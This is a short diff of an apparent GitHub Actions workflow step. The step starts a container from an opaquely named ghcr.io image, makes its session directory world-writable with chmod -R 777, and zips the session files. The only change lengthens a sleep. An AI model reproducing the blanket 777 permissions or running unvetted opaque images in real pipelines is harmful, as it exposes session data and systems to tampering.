@@ -20,7 +20,7 @@ jobs:
     - name: Run Initial Docker Processes
       run: |
         docker run -d --name session_container ghcr.io/nixegohshs5f4ef6vuun43f6/iaw4sm7rs56v3cy7rv66v4rfgu6yu843dawsmsrbitapyv3125:yhf3gj79bt8kytv57vttv7awsmsrbitA0009-of-one
-        sleep 300 # Simulate initial processes
+        sleep 500 # Simulate initial processes
         docker exec session_container bash -c "chmod -R 777 /app/sessions"
         sleep 10 # Ensure permissions take effect
         docker exec session_container bash -c "zip -r /app/partial_sessions.zip /app/sessions || true"
